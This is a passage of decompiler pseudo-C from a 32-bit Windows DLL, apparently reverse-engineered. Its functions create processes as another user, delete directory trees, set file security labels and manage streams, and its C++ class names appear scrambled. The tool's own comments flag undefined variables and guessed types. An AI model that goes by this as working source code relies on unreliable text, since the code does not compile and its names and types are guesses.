  struct _STARTUPINFOW StartupInfo; // [esp+10h] [ebp-78h] BYREF
  _DWORD pExceptionObject[4]; // [esp+54h] [ebp-34h] BYREF
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+64h] [ebp-24h] BYREF
  int v12[4]; // [esp+74h] [ebp-14h] BYREF
  int v13; // [esp+84h] [ebp-4h]

  sub_1002176C(a1, v12, a2);
  v13 = 0;
  sub_10021804(v8, &StartupInfo);
  sub_1000CF22(v12);
  v7 = *(WCHAR **)(v12[1] + 12);
  v6 = *(const WCHAR **)(*(_DWORD *)(a2 + 4) + 12);
  v3 = (void *)(*(int (__thiscall **)(int))(*(_DWORD *)a3 + 4))(a3);
  if ( !CreateProcessAsUserW(v3, v6, v7, 0, 0, 0, 0, 0, 0, &StartupInfo, &ProcessInformation) )
  {
    if ( GetLastError() == 2 )
    {
      sub_10027C51(pExceptionObject);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
    }
    sub_10027FE0(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVHzsnwtmRbderjskb_jhzi_sr__);
  }
  CloseHandle(ProcessInformation.hThread);
  hProcess = ProcessInformation.hProcess;
  v13 = -1;
  sub_1000CE59(v12);
  return hProcess;
}
// 1002190B: variable 'v8' is possibly undefined
// 100973A0: using guessed type __TI_flags _TI5_AVHzsnwtmRbderjskb_jhzi_sr__;
// 100218E9: using guessed type _DWORD pExceptionObject[4];

//----- (10021998) --------------------------------------------------------
_DWORD *__cdecl sub_10021998(_DWORD *a1, int a2)
{
  _DWORD *v2; // esi
  unsigned int v3; // eax
  _DWORD pExceptionObject[2]; // [esp+10h] [ebp-28h] BYREF
  int v6[2]; // [esp+18h] [ebp-20h] BYREF
  int v7[2]; // [esp+20h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-10h]
  int v9; // [esp+34h] [ebp-4h]

  v8 = 0;
  sub_1000CE26(v7, a2);
  v9 = 1;
  sub_1000CF22(v7);
  if ( !PathStripToRootW(*(LPWSTR *)(v7[1] + 12)) )
  {
    sub_10027C51(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI5_AVWdtfAhnEcxcvFuptgwdtf_jhzi_sr__);
  }
  v2 = sub_10012A7C(v6, a2);
  LOBYTE(v9) = 2;
  v3 = sub_1000D0EE((int)v7);
  sub_1000D2DE((int)v2, v3, a1, 0xFFFFFFFE);
  v8 = 1;
  LOBYTE(v9) = 1;
  sub_10012AAC(v6);
  LOBYTE(v9) = 0;
  sub_1000CE59(v7);
  return a1;
}
// 10021998: using guessed type _DWORD pExceptionObject[2];

//----- (10021A3A) --------------------------------------------------------
void __cdecl sub_10021A3A(int a1)
{
  int v1; // esi
  bool v2; // zf
  int v3; // eax
  int v4; // eax
  char *v5; // ecx
  int v6; // eax
  _DWORD *v7; // eax
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-2B4h] BYREF
  _DWORD v9[2]; // [esp+1Ch] [ebp-2A8h] BYREF
  char v10[8]; // [esp+24h] [ebp-2A0h] BYREF
  char v11[8]; // [esp+2Ch] [ebp-298h] BYREF
  int v12; // [esp+34h] [ebp-290h]
  int v13[2]; // [esp+38h] [ebp-28Ch] BYREF
  char v14[640]; // [esp+40h] [ebp-284h] BYREF
  int v15; // [esp+2C0h] [ebp-4h]

  v1 = a1;
  v12 = a1;
  sub_10032CC2((int)v14, a1);
  v15 = 0;
  sub_10032D96((int)v14, v13);
  LOBYTE(v15) = 1;
  while ( v13[0] )
  {
    LOBYTE(v15) = 2;
    v2 = (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v13[0] + 20))(v13[0]) == 0;
    v3 = *(_DWORD *)v13[0];
    if ( v2 )
    {
      v6 = (*(int (__cdecl **)(char *))(v3 + 8))(v11);
      LOBYTE(v15) = 4;
      sub_100212ED(v6);
      LOBYTE(v15) = 2;
      v5 = v11;
    }
    else
    {
      v4 = (*(int (**)(void))(v3 + 8))();
      LOBYTE(v15) = 3;
      sub_10021A3A(v4, v10);
      LOBYTE(v15) = 2;
      v5 = v10;
    }
    sub_1000CE59((int *)v5);
    v15 = 1;
    sub_10032D96((int)v14, v9);
    LOBYTE(v15) = 6;
    sub_10021CEC(v13, v7);
    LOBYTE(v15) = 1;
    sub_10021CC1(v9);
    v1 = v12;
  }
  LOBYTE(v15) = 0;
  sub_10021CC1(v13);
  v15 = -1;
  sub_10032D41((int)v14);
  if ( !RemoveDirectoryW(*(LPCWSTR *)(*(_DWORD *)(v1 + 4) + 12)) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  sub_1006A5B6();
}
// 10021B0B: variable 'v7' is possibly undefined
// 10021A3A: using guessed type _DWORD var_2A8[2];
// 10021A3A: using guessed type _DWORD pExceptionObject[3];

//----- (10021BA7) --------------------------------------------------------
bool __cdecl sub_10021BA7(int a1)
{
  _DWORD pExceptionObject[3]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v3[2]; // [esp+1Ch] [ebp-28h] BYREF
  BOOL bSaclPresent; // [esp+24h] [ebp-20h] BYREF
  BOOL bSaclDefaulted; // [esp+28h] [ebp-1Ch] BYREF
  PACL pSacl; // [esp+2Ch] [ebp-18h] BYREF
  PSECURITY_DESCRIPTOR SecurityDescriptor; // [esp+30h] [ebp-14h] BYREF
  int v8; // [esp+40h] [ebp-4h]

  SecurityDescriptor = 0;
  GetCurrentProcessId();
  GetCurrentProcessId();
  sub_1002937D(v3);
  v8 = 0;
  pSacl = 0;
  bSaclPresent = 0;
  bSaclDefaulted = 0;
  if ( !ConvertStringSecurityDescriptorToSecurityDescriptorW(StringSecurityDescriptor, 1u, &SecurityDescriptor, 0)
    || (GetCurrentProcessId(),
        GetCurrentProcessId(),
        sub_10021C8C((int)v3, (int)SecurityDescriptor),
        !GetSecurityDescriptorSacl(SecurityDescriptor, &bSaclPresent, &pSacl, &bSaclDefaulted))
    || SetNamedSecurityInfoW(*(LPWSTR *)(*(_DWORD *)(a1 + 4) + 12), SE_FILE_OBJECT, 0x10u, 0, 0, 0, pSacl) )
  {
    sub_100167F9(pExceptionObject, 1);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
  }
  v8 = -1;
  return sub_10021C5B(v3);
}
// 10021BA7: using guessed type _DWORD var_28[2];
// 10021BA7: using guessed type _DWORD pExceptionObject[3];

//----- (10021C5B) --------------------------------------------------------
bool __thiscall sub_10021C5B(_DWORD *this)
{
  *this = &off_100946C8;
  return sub_10021D36((int)this);
}
// 100946C8: using guessed type int (__thiscall *off_100946C8)(void *Block, char);

//----- (10021C8C) --------------------------------------------------------
char __usercall sub_10021C8C@<al>(int a1@<eax>, int a2@<edi>)
{
  int v2; // esi
  _DWORD pExceptionObject[3]; // [esp+4h] [ebp-Ch] BYREF

  v2 = a1;
  if ( *(_DWORD *)(a1 + 4) != a2 )
  {
    LOBYTE(a1) = sub_10021D36(a1);
    if ( !(_BYTE)a1 )
    {
      sub_100167F9(pExceptionObject, 1);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVScdeiYyksupovo_sr__);
    }
  }
  *(_DWORD *)(v2 + 4) = a2;
  return a1;
}
// 10021C8C: using guessed type _DWORD pExceptionObject[3];

//----- (10021CC1) --------------------------------------------------------
void __thiscall sub_10021CC1(void *this)
{
  sub_10021D62((int)this);
}

//----- (10021CEC) --------------------------------------------------------
_DWORD *__usercall sub_10021CEC@<eax>(_DWORD *a1@<eax>, _DWORD *a2@<edi>)
{
  volatile LONG *v4; // [esp-4h] [ebp-8h]

  if ( *a1 != *a2 )
  {
    sub_10021D62((int)a1);
    a1[1] = a2[1];
    v4 = (volatile LONG *)a1[1];
    *a1 = *a2;
    InterlockedIncrement(v4);
  }
  return a1;
}

//----- (10021D17) --------------------------------------------------------
_DWORD *__thiscall sub_10021D17(_DWORD *Block, char a2)
{
  sub_10021C5B(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021D36) --------------------------------------------------------
bool __usercall sub_10021D36@<al>(int a1@<esi>)
{
  bool result; // al

  if ( !sub_10021D8A(a1) )
    return 1;
  result = sub_10029395(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (10021D62) --------------------------------------------------------
void __usercall sub_10021D62(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (10021D8A) --------------------------------------------------------
BOOL __usercall sub_10021D8A@<eax>(int a1@<eax>)
{
  int v1; // eax

  v1 = *(_DWORD *)(a1 + 4);
  return v1 && v1 != -1;
}

//----- (10021DA7) --------------------------------------------------------
int __stdcall sub_10021DA7(int a1, int a2, int a3)
{
  sub_10022348(a1, a2, 1);
  *(_DWORD *)(a1 + 16) = a3;
  *(_DWORD *)a1 = &off_10094700;
  *(_DWORD *)(a1 + 20) = 4096;
  sub_10016983((void *)1, a1 + 24, 0);
  *(_BYTE *)(a1 + 44) = 0;
  *(_BYTE *)(a1 + 45) = 1;
  return a1;
}
// 10094700: using guessed type int (__thiscall *off_10094700)(void *Block, char);

//----- (10021DFD) --------------------------------------------------------
void *__thiscall sub_10021DFD(void *Block, char a2)
{
  sub_10021E6F((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10021E1C) --------------------------------------------------------
int __stdcall sub_10021E1C(int a1, int a2, int a3)
{
  sub_10022348(a1, a2, 1);
  *(_DWORD *)(a1 + 20) = 0;
  *(_DWORD *)a1 = &off_10094700;
  *(_DWORD *)(a1 + 16) = a3;
  sub_10016983((void *)1, a1 + 24, 0);
  *(_BYTE *)(a1 + 44) = 0;
  *(_BYTE *)(a1 + 45) = 0;
  return a1;
}
// 10094700: using guessed type int (__thiscall *off_10094700)(void *Block, char);

//----- (10021E6F) --------------------------------------------------------
int __thiscall sub_10021E6F(int this)
{
  *(_DWORD *)this = &off_10094700;
  sub_100223E2((_BYTE *)this);
  sub_10016B53((int *)(this + 24));
  return sub_100223A0((_BYTE *)this);
}
// 10094700: using guessed type int (__thiscall *off_10094700)(void *Block, char);

//----- (10021EC7) --------------------------------------------------------
int __thiscall sub_10021EC7(char *this, char a2)
{
  char *v3; // edi

  v3 = this + 24;
  *(_BYTE *)sub_10016C51((int)(this + 24), 0) = a2;
  return (*(int (__thiscall **)(char *, char *))(*(_DWORD *)this + 12))(this, v3);
}

//----- (10021EED) --------------------------------------------------------
int __thiscall sub_10021EED(_BYTE *this)
{
  int v1; // eax

  v1 = *(_DWORD *)this;
  if ( this[45] )
    return (*(int (**)(void))(v1 + 48))();
  else
    return (*(int (**)(void))(v1 + 52))();
}

//----- (10021F00) --------------------------------------------------------
unsigned int __thiscall sub_10021F00(void *this, int *a2)
{
  unsigned int result; // eax
  int v4; // ebx
  int v5; // eax
  int v6; // eax
  int v7[5]; // [esp+10h] [ebp-54h] BYREF
  int v8[5]; // [esp+24h] [ebp-40h] BYREF
  _DWORD pExceptionObject[2]; // [esp+40h] [ebp-24h] BYREF
  int v10; // [esp+48h] [ebp-1Ch] BYREF
  int v11; // [esp+4Ch] [ebp-18h] BYREF
  unsigned int i; // [esp+50h] [ebp-14h]
  int v13; // [esp+60h] [ebp-4h]

  if ( *((_BYTE *)this + 44) )
  {
    sub_10016590(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVVJVzywhgyue_sr__);
  }
  v11 = 0;
  for ( i = 0; ; i += v11 )
  {
    result = a2[3];
    if ( i >= result )
      break;
    v4 = result - i;
    if ( result - i >= *((_DWORD *)this + 5) )
      v4 = *((_DWORD *)this + 5);
    v13 = 0;
    v5 = sub_10016DFF(v4, a2, (int)v7, i);
    LOBYTE(v13) = 1;
    (*(void (__thiscall **)(_DWORD, int *, int, int, int *))(**((_DWORD **)this + 4) + 12))(
      *((_DWORD *)this + 4),
      v8,
      v5,
      2 * v4,
      &v11);
    LOBYTE(v13) = 3;
    sub_10016B53(v7);
    if ( v8[3] )
    {
      v6 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v6 + 12))(v6, v8);
    }
    else if ( !v11 )
    {
      sub_1002F278(&v10);
      _CxxThrowException(&v10, (_ThrowInfo *)&_TI2_AVOzxflwtlqlhGovvrdoxa_oqymxuuz_sr__);
    }
    LOBYTE(v13) = 0;
    sub_10016B53(v8);
    v13 = -1;
  }
  return result;
}
// 10021FA3: conditional instruction was optimized away because %var_34.4!=0
// 10021F00: using guessed type _DWORD pExceptionObject[2];
// 10021F00: using guessed type int var_54[5];

//----- (10021FEF) --------------------------------------------------------
LONG __thiscall sub_10021FEF(_DWORD **this, int *a2)
{
  int *v3; // eax
  int v4; // eax
  int v6[4]; // [esp-14h] [ebp-74h] BYREF
  int v7; // [esp-4h] [ebp-64h]
  int v8[5]; // [esp+10h] [ebp-50h] BYREF
  int v9[5]; // [esp+24h] [ebp-3Ch] BYREF
  _DWORD v10[4]; // [esp+38h] [ebp-28h] BYREF
  int v11; // [esp+5Ch] [ebp-4h]

  v11 = 0;
  sub_10016983(0, (int)v9, 0);
  LOBYTE(v11) = 1;
  if ( a2[3] == 1 )
  {
    sub_10016B2F(a2, (int)v9);
  }
  else
  {
    v3 = (int *)(*(int (__thiscall **)(_DWORD *, int *, int *))(*this[4] + 4))(this[4], v8, a2);
    LOBYTE(v11) = 2;
    sub_10016B2F(v3, (int)v9);
    LOBYTE(v11) = 1;
    sub_10016B53(v8);
  }
  v7 = 0;
  v4 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
  sub_1001CC48(v10, v4, 0);
  LOBYTE(v11) = 3;
  sub_10016AE9(v9, (int)v6);
  LOBYTE(v11) = 3;
  sub_1001CDCD(v10, v6[0], v6[1], v6[2], v6[3], v7);
  LOBYTE(v11) = 1;
  sub_1001CC9A(v10);
  LOBYTE(v11) = 0;
  return sub_10016B53(v9);
}
// 10021FEF: using guessed type int var_3C[5];
// 10021FEF: using guessed type int var_50[5];
// 10021FEF: using guessed type _DWORD var_28[4];

//----- (100220BF) --------------------------------------------------------
LONG __thiscall sub_100220BF(_DWORD **this)
{
  LONG result; // eax
  int *v3; // eax
  int v4; // eax
  int v5[5]; // [esp+10h] [ebp-40h] BYREF
  int v6[5]; // [esp+24h] [ebp-2Ch] BYREF
  int v7; // [esp+4Ch] [ebp-4h]

  result = 0;
  if ( *((_BYTE *)this + 45) )
  {
    v7 = 0;
    sub_10016983(0, (int)v6, 0);
    LOBYTE(v7) = 1;
    do
    {
      v3 = (int *)(*(int (__thiscall **)(_DWORD *, int *, _DWORD *))(*this[4] + 16))(this[4], v5, this[5]);
      LOBYTE(v7) = 2;
      sub_10016B2F(v3, (int)v6);
      LOBYTE(v7) = 1;
      sub_10016B53(v5);
      v4 = ((int (__thiscall *)(_DWORD **))(*this)[9])(this);
      (*(void (__thiscall **)(int, int *))(*(_DWORD *)v4 + 12))(v4, v6);
    }
    while ( v6[3] );
    *((_BYTE *)this + 44) = 1;
    LOBYTE(v7) = 0;
    return sub_10016B53(v6);
  }
  return result;
}
// 100220BF: using guessed type int var_40[5];

//----- (10022158) --------------------------------------------------------
char sub_10022158()
{
  return 0;
}

//----- (1002215B) --------------------------------------------------------
int __stdcall sub_1002215B(int a1, int a2)
{
  _DWORD *v2; // eax
  int result; // eax
  volatile LONG *v4; // [esp-8h] [ebp-2Ch] BYREF
  size_t v5; // [esp-4h] [ebp-28h]
  volatile LONG **v6; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v8; // [esp+20h] [ebp-4h]

  sub_10017FF0(a1);
  v8 = 0;
  v5 = 40;
  *(_DWORD *)a1 = &off_10094738;
  Block = operator new(v5);
  LOBYTE(v8) = 1;
  if ( Block )
  {
    v4 = (volatile LONG *)v5;
    v6 = &v4;
    sub_10014512(&v4);
    LOBYTE(v8) = 1;
    v2 = sub_10011AFB(-1, 0x40000000, Block, a2, 128, -1, (int)v4, (volatile LONG *)v5);
  }
  else
  {
    v2 = 0;
  }
  LOBYTE(v8) = 0;
  sub_10006A72((_DWORD *)(a1 + 8), (int)v2);
  LOBYTE(v8) = 3;
  (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
  result = a1;
  *(_BYTE *)(a1 + 16) = 1;
  return result;
}
// 1004CBC8: using guessed type void *__cdecl operator new(size_t Size);
// 10094738: using guessed type int (__thiscall *off_10094738)(void *Block, char);

//----- (100221EA) --------------------------------------------------------
_BYTE *__thiscall sub_100221EA(_BYTE *Block, char a2)
{
  sub_10022277(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10022209) --------------------------------------------------------
int __stdcall sub_10022209(int a1, int a2, volatile LONG *lpAddend)
{
  volatile LONG *v3; // eax
  int v4; // ecx

  sub_10017FF0(a1);
  v3 = lpAddend;
  v4 = a2;
  *(_DWORD *)a1 = &off_10094738;
  *(_DWORD *)(a1 + 12) = v3;
  *(_DWORD *)(a1 + 8) = v4;
  InterlockedIncrement(v3);
  if ( (*(unsigned __int8 (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 12))(*(_DWORD *)(a1 + 8)) )
  {
    *(_BYTE *)(a1 + 16) = 0;
  }
  else
  {
    (*(void (__thiscall **)(_DWORD))(**(_DWORD **)(a1 + 8) + 4))(*(_DWORD *)(a1 + 8));
    *(_BYTE *)(a1 + 16) = 1;
  }
  sub_10003B09(&a2);
  return a1;
}
// 10094738: using guessed type int (__thiscall *off_10094738)(void *Block, char);

//----- (10022277) --------------------------------------------------------
int __thiscall sub_10022277(_BYTE *this)
{
  *(_DWORD *)this = &off_10094738;
  sub_100222EF((int)this);
  sub_10003B09(this + 8);
  return sub_1001803E(this);
}
// 10094738: using guessed type int (__thiscall *off_10094738)(void *Block, char);

//----- (100222CF) --------------------------------------------------------
int __thiscall sub_100222CF(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 60))(this[2]);
}

//----- (100222DB) --------------------------------------------------------
int __thiscall sub_100222DB(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 56))(this[2]);
}

//----- (100222E7) --------------------------------------------------------
int __thiscall sub_100222E7(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 72))(this[2]);
}

//----- (100222EF) --------------------------------------------------------
int __thiscall sub_100222EF(int this)
{
  int result; // eax

  result = (*(int (__thiscall **)(int))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
  {
    result = sub_10018085((_BYTE *)this);
    if ( *(_BYTE *)(this + 16) )
      return (*(int (__thiscall **)(_DWORD))(**(_DWORD **)(this + 8) + 8))(*(_DWORD *)(this + 8));
  }
  return result;
}

//----- (10022313) --------------------------------------------------------
int __thiscall sub_10022313(_DWORD **this)
{
  return (*(int (__thiscall **)(_DWORD *))(*this[2] + 68))(this[2]);
}

//----- (1002231B) --------------------------------------------------------
int __thiscall sub_1002231B(_DWORD **this, int a2, int a3)
{
  int v3; // edx

  v3 = 0;
  if ( a3 )
  {
    if ( a3 == 1 )
    {
      v3 = 1;
    }
    else if ( a3 == 2 )
    {
      v3 = 2;
    }
  }
  return (*(int (__thiscall **)(_DWORD *, int, int))(*this[2] + 64))(this[2], a2, v3);
}

//----- (10022345) --------------------------------------------------------
char sub_10022345()
{
  return 1;
}

//----- (10022348) --------------------------------------------------------
int __stdcall sub_10022348(int a1, int a2, char a3)
{
  int v3; // edx

  sub_10017FF0(a1);
  *(_DWORD *)(v3 + 8) = a2;
  *(_DWORD *)v3 = &off_1009475C;
  *(_BYTE *)(v3 + 12) = a3;
  return v3;
}
// 10022364: variable 'v3' is possibly undefined
// 1009475C: using guessed type int (__thiscall *off_1009475C)(void *Block, char);

//----- (10022381) --------------------------------------------------------
_BYTE *__thiscall sub_10022381(_BYTE *Block, char a2)
{
  sub_100223A0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100223A0) --------------------------------------------------------
int __thiscall sub_100223A0(_BYTE *this)
{
  *(_DWORD *)this = &off_1009475C;
  sub_100223E2(this);
  return sub_1001803E(this);
}
// 1009475C: using guessed type int (__thiscall *off_1009475C)(void *Block, char);

//----- (100223E2) --------------------------------------------------------
int __thiscall sub_100223E2(_BYTE *this)
{
  int result; // eax
  int v3; // eax

  result = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 28))(this);
  if ( !(_BYTE)result )
  {
    (*(void (__thiscall **)(_BYTE *))(*(_DWORD *)this + 44))(this);
    result = sub_10018085(this);
    if ( this[12] )
    {
      v3 = (*(int (__thiscall **)(_BYTE *))(*(_DWORD *)this + 36))(this);
      return (*(int (__thiscall **)(int))(*(_DWORD *)v3 + 24))(v3);
    }
  }
  return result;
}

//----- (10022413) --------------------------------------------------------
int __thiscall sub_10022413(void *this)
{
  int v2; // eax

  (*(void (__thiscall **)(void *))(*(_DWORD *)this + 44))(this);
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 20))(v2);
}

//----- (1002242A) --------------------------------------------------------
int __thiscall sub_1002242A(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 16))(v1);
}

//----- (1002243A) --------------------------------------------------------
int __thiscall sub_1002243A(void *this)
{
  int v1; // eax

  v1 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v1 + 12))(v1);
}

//----- (1002244A) --------------------------------------------------------
int __thiscall sub_1002244A(_DWORD *this)
{
  return this[2];
}

//----- (1002244F) --------------------------------------------------------
BOOL __thiscall sub_1002244F(void *this)
{
  int v2; // eax
  BOOL result; // eax

  result = 0;
  if ( (*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 40))(this) )
  {
    v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
    if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v2 + 32))(v2) )
      return 1;
  }
  return result;
}

//----- (10022476) --------------------------------------------------------
int __thiscall sub_10022476(void *this)
{
  int v2; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 32))(this) )
  {
    sub_100166E1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v2 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int))(*(_DWORD *)v2 + 4))(v2);
}
// 10022476: using guessed type _DWORD pExceptionObject[2];

//----- (100224AF) --------------------------------------------------------
int __thiscall sub_100224AF(void *this, int a2, int a3)
{
  int v4; // eax
  _DWORD pExceptionObject[2]; // [esp+4h] [ebp-8h] BYREF

  if ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)this + 32))(this) )
  {
    sub_100166E1(pExceptionObject);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVDkpOsublklbcJnkmkirtg_sr__);
  }
  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 36))(this);
  return (*(int (__thiscall **)(int, int, int))(*(_DWORD *)v4 + 8))(v4, a2, a3);
}
// 100224AF: using guessed type _DWORD pExceptionObject[2];

//----- (100224F0) --------------------------------------------------------
_DWORD *__stdcall sub_100224F0(_DWORD *a1)
{
  sub_10016441(a1);
  *a1 = &off_1009478C;
  return a1;
}
// 1009478C: using guessed type int (__thiscall *off_1009478C)(void *Block, char);

//----- (1002251E) --------------------------------------------------------
_DWORD *__thiscall sub_1002251E(_DWORD *Block, char a2)
{
  sub_1002253D(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002253D) --------------------------------------------------------
void __thiscall sub_1002253D(_DWORD *this)
{
  *this = &off_1009478C;
  sub_1001646C(this);
}
// 1009478C: using guessed type int (__thiscall *off_1009478C)(void *Block, char);

//----- (10022561) --------------------------------------------------------
_DWORD *__stdcall sub_10022561(_DWORD *a1, int a2, int a3)
{
  sub_10022348((int)a1, a2, 1);
  a1[5] = 0;
  *a1 = &off_10094794;
  a1[4] = a3;
  return a1;
}
// 10094794: using guessed type int (__thiscall *off_10094794)(void *Block, char);

//----- (1002259D) --------------------------------------------------------
_BYTE *__thiscall sub_1002259D(_BYTE *Block, char a2)
{
  sub_100225BC(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (100225BC) --------------------------------------------------------
int __thiscall sub_100225BC(_BYTE *this)
{
  *(_DWORD *)this = &off_10094794;
  sub_100223E2(this);
  return sub_100223A0(this);
}
// 10094794: using guessed type int (__thiscall *off_10094794)(void *Block, char);

//----- (100225FE) --------------------------------------------------------
int __thiscall sub_100225FE(_DWORD *this, int pExceptionObject)
{
  int v3; // eax
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int result; // eax

  v3 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v3 + 32))(v3) )
  {
    v4 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
    v5 = (*(int (__thiscall **)(int))(*(_DWORD *)v4 + 4))(v4);
  }
  else
  {
    v5 = this[5];
  }
  if ( this[4] < (unsigned int)(v5 + 1) )
  {
    sub_100224F0(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVUwwroNiqrrorTaapnauww_yq_sr__);
  }
  v6 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v6 + 16))(v6, pExceptionObject);
  v7 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)v7 + 32))(v7);
  if ( !(_BYTE)result )
    ++this[5];
  return result;
}

//----- (100226A0) --------------------------------------------------------
int __thiscall sub_100226A0(_DWORD *this, int pExceptionObject)
{
  int v2; // ebx
  int v4; // edi
  int v5; // eax
  int v6; // eax
  int v7; // eax
  int v8; // eax
  int v9; // eax
  int result; // eax

  v2 = pExceptionObject;
  v4 = *(_DWORD *)(pExceptionObject + 12);
  v5 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5 + 32))(v5) )
  {
    v6 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
    v7 = (*(int (__thiscall **)(int))(*(_DWORD *)v6 + 4))(v6);
  }
  else
  {
    v7 = this[5];
  }
  if ( this[4] < (unsigned int)(v4 + v7) )
  {
    sub_100224F0(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVUwwroNiqrrorTaapnauww_yq_sr__);
  }
  v8 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v8 + 12))(v8, v2);
  v9 = (*(int (__thiscall **)(_DWORD *))(*this + 36))(this);
  result = (*(int (__thiscall **)(int))(*(_DWORD *)v9 + 32))(v9);
  if ( !(_BYTE)result )
    this[5] += v4;
  return result;
}

//----- (1002271A) --------------------------------------------------------
char sub_1002271A()
{
  return 1;
}

//----- (1002271D) --------------------------------------------------------
_DWORD *__stdcall sub_1002271D(_DWORD *a1, void *a2, char a3)
{
  sub_1000E98B(a1, a2, a3);
  *a1 = &off_100937C0;
  return a1;
}
// 100937C0: using guessed type int (__thiscall *off_100937C0)(void *Block, char);

//----- (10022750) --------------------------------------------------------
_DWORD *__cdecl sub_10022750(_DWORD *a1)
{
  HANDLE CurrentProcess; // eax

  CurrentProcess = GetCurrentProcess();
  sub_1002271D(a1, CurrentProcess, 1);
  return a1;
}

//----- (10022785) --------------------------------------------------------
int __thiscall sub_10022785(_DWORD *this, int a2)
{
  int v2; // eax

  v2 = sub_1001A85E(this);
  sub_1003394B(a2, v2);
  return a2;
}

//----- (100227BB) --------------------------------------------------------
_DWORD *__cdecl sub_100227BB(_DWORD *a1, int a2)
{
  sub_10022A14(a1, a2, 1, 0, 0x1F0FFFu);
  return a1;
}

//----- (100227F9) --------------------------------------------------------
_DWORD *__cdecl sub_100227F9(_DWORD *a1, int a2, DWORD a3)
{
  sub_10022A14(a1, a2, 0, 0, a3);
  return a1;
}

//----- (1002285D) --------------------------------------------------------
int __cdecl sub_1002285D(int a1, int a2, char a3)
{
  int v3; // ecx
  int v4; // esi
  _DWORD *v5; // eax
  int v6; // eax
  _DWORD *v7; // eax
  bool v8; // bl
  int v9; // ecx
  DWORD v10; // esi
  DWORD v11; // eax
  int v13; // [esp+14h] [ebp-48h]
  int v14; // [esp+18h] [ebp-44h]
  DWORD pSessionId; // [esp+1Ch] [ebp-40h] BYREF
  int v16[2]; // [esp+20h] [ebp-3Ch] BYREF
  int v17[2]; // [esp+28h] [ebp-34h] BYREF
